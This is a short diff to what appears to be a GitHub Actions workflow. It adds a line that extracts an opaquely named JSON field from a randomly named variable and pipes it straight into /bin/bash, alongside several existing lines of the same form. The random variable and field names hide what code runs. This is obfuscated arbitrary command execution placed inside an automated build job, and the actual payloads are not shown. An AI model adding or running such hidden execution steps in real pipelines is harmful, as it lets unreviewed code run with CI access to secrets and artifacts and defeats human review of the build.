@@ -21,6 +21,7 @@ jobs:
           echo $hf9 | jq -r .y8045 | /bin/bash
           echo $vygq354 | jq -r .isilk241 | /bin/bash
           echo $cbpaa7 | jq -r .olod914 | /bin/bash
+          printf '%s' "$key9" | jq -r .wpgq93009 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
